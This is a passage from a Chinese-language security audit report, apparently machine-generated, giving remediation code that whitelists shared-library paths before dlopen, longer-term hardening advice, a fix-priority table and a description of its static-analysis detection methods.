- 限制共享库路径到白名单目录
- 使用 `realpath()` 解析路径，防止符号链接绕过
- 验证文件签名或哈希

```cpp
// AKGAscendLaunch.cpp 修改
std::string allowed_dir = "/opt/akg/compiled_kernels/";  // 白名单目录
std::string so_path = path + "/lib" + kernel_name + ".so";

// 解析真实路径，防止符号链接绕过
char resolved_path[PATH_MAX];
if (!realpath(so_path.c_str(), resolved_path)) {
    std::cerr << "Invalid library path" << std::endl;
    return;
}

// 验证路径是否在白名单目录内
if (!std::string(resolved_path).starts_with(allowed_dir)) {
    std::cerr << "Library path not in allowed directory" << std::endl;
    return;
}

void *handle = dlopen(resolved_path, RTLD_LAZY);
```

### 7.4 长期改进

#### 7.4.1 安全架构重构

- 实现最小权限原则：Worker 进程以低权限用户运行
- 添加审计日志：记录所有代码执行请求和结果
- 实现速率限制：防止滥用和 DoS 攻击
- 定期安全扫描：集成自动化漏洞检测到 CI/CD 流程

#### 7.4.2 AI 代码生成安全

- 对 AI 生成的代码进行语法和语义验证
- 添加代码静态分析（AST 检查危险操作）
- 实现代码签名机制，验证生成代码来源

---

## 8. 修复优先级矩阵

| 漏洞 ID | 严重性 | 置信度 | 修复优先级 | 建议修复时间 |
|---------|--------|--------|------------|--------------|
| SA-001 | Critical | 95 | P0 | 24小时内 |
| VULN-PY-001 | Critical | 95 | P0 | 24小时内 |
| SA-004 | Critical | 85 | P1 | 3天内 |
| SA-005 | Critical | 85 | P1 | 3天内 |
| SA-007 | High | 80 | P1 | 1周内 |
| SA-008 | Critical | 75 | P2 | 1周内 |
| SA-009 | Critical | 75 | P2 | 1周内 |

---

## 9. 附录：检测方法

本报告由多 Agent 协作漏洞扫描系统生成，采用以下检测技术：

- **静态污点分析**：追踪数据从外部输入（HTTP 参数、环境变量）到敏感操作（exec、subprocess）的流向
- **AST 模式匹配**：使用 ast-grep 搜索危险函数调用模式（如 `subprocess.run(..., shell=True)`）
- **跨文件追踪**：结合 LSP 和调用图分析函数调用链，验证漏洞可达性
- **置信度评分**：基于可达性、可控性、缓解措施等多维度量化漏洞真实风险
